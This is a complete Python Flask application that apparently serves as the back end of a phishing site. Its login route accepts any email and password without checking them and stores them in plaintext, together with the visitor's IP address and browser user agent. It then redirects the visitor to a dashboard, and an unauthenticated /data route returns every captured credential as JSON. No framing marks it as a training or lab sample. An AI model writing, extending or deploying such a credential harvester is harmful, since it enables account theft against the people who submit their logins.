from flask import Flask, render_template, request, redirect, url_for
import sqlite3
import os

app = Flask(__name__)

# Initialize DB
def init_db():
    conn = sqlite3.connect('credentials.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS credentials (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    email TEXT NOT NULL,
                    password TEXT NOT NULL,
                    ip_address TEXT,
                    user_agent TEXT,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                )''')
    conn.commit()
    conn.close()

init_db()

@app.route('/')
def login_page():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    conn = sqlite3.connect('credentials.db')
    c = conn.cursor()
    c.execute("INSERT INTO credentials (email, password, ip_address, user_agent) VALUES (?, ?, ?, ?)",
              (email, password, ip_address, user_agent))
    conn.commit()
    conn.close()

    return redirect(url_for('dashboard'))

@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html')

@app.route('/data')
def show_data():
    conn = sqlite3.connect('credentials.db')
    c = conn.cursor()
    c.execute("SELECT * FROM credentials ORDER BY timestamp DESC")
    data = c.fetchall()
    conn.close()
    return {'credentials': data}

if __name__ == '__main__':
    app.run(debug=True)
